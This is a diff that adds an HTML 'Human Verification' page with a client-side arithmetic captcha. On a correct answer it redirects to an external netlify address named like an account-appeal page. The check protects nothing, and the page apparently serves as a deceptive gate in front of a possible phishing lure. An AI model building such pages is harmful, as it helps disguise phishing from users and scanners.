@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0) 70%);
+            z-index: 0;
+        }
+
+        .robot-icon {
+            font-size: 80px;
+            color: #6a11cb;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .verification-box {
+            background: #f8f9ff;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 25px 0;
+            border: 1px solid #e0e4ff;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            position: relative;
+            z-index: 1;
+        }
+
+        .math-problem {
+            font-size: 38px;
+            margin: 20px 0;
+            color: #333;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+
+        .input-group {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+        }
+
+        input {
+            width: 150px;
+            padding: 15px;
+            font-size: 22px;
+            text-align: center;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            outline: none;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+
+        input:focus {
+            border-color: #6a11cb;
+            box-shadow: 0 0 0 3px rgba(106, 17, 203, 0.2);
+        }
+
+        .btn {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(37, 117, 252, 0.4);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(37, 117, 252, 0.6);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+            z-index: -1;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            display: block;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+
+        .security-info {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            color: #888;
+            font-size: 14px;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 25px;
+            }
+            .math-problem {
+                font-size: 32px;
+            }
+            input {
+                width: 120px;
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <i class="fas fa-robot robot-icon"></i>
+        <h1>Human Verification</h1>
+        <p class="subtitle">Please solve this math problem to prove you're not a robot</p>
+
+        <div class="verification-box">
+            <p>Solve the simple addition problem to continue</p>
+            <div class="math-problem" id="mathProblem">5 + 3 = ?</div>
+
+            <div class="input-group">
+                <input type="number" id="answerInput" placeholder="Your answer" min="0">
+            </div>
+
+            <button class="btn" id="verifyBtn">Verify</button>
+
+            <div class="status-message" id="statusMessage"></div>
+        </div>
+
+        <div class="security-info">
+            <i class="fas fa-shield-alt"></i>
+            <span>This helps prevent automated programs from accessing the system</span>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 Security Verification System | All rights reserved</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const mathProblem = document.getElementById('mathProblem');
+            const answerInput = document.getElementById('answerInput');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const statusMessage = document.getElementById('statusMessage');
+
+            // Generate random numbers for the math problem
+            const num1 = Math.floor(Math.random() * 10) + 1;
+            const num2 = Math.floor(Math.random() * 10) + 1;
+            const correctAnswer = num1 + num2;
+
+            // Display the math problem
+            mathProblem.textContent = `${num1} + ${num2} = ?`;
+
+            // Focus the input field
+            answerInput.focus();
+
+            // Handle verification
+            verifyBtn.addEventListener('click', verifyAnswer);
+            answerInput.addEventListener('keyup', function(event) {
+                if (event.key === 'Enter') {
+                    verifyAnswer();
+                }
+            });
+
+            function verifyAnswer() {
+                const userAnswer = parseInt(answerInput.value);
+
+                if (isNaN(userAnswer)) {
+                    showMessage('Please enter a valid number', 'error');
+                    return;
+                }
+
+                if (userAnswer === correctAnswer) {
+                    showMessage('Verification successful! Redirecting...', 'success');
+                    verifyBtn.disabled = true;
+                    answerInput.disabled = true;
+
+                    // Redirect after a short delay
+                    setTimeout(() => {
+                        window.location.href = 'https://now-appeal-bad-post.netlify.app/'; // Replace with your external URL
+                    }, 2000);
+                } else {
+                    showMessage('Incorrect answer. Please try again.', 'error');
+                    answerInput.value = '';
+                    answerInput.focus();
+
+                    // Shake animation for wrong answer
+                    mathProblem.classList.add('pulse');
+                    setTimeout(() => {
+                        mathProblem.classList.remove('pulse');
+                    }, 500);
+                }
+            }
+
+            function showMessage(message, type) {
+                statusMessage.textContent = message;
+                statusMessage.className = 'status-message ' + type;
+            }
+        });
+    </script>
+</body>
+
+</html>
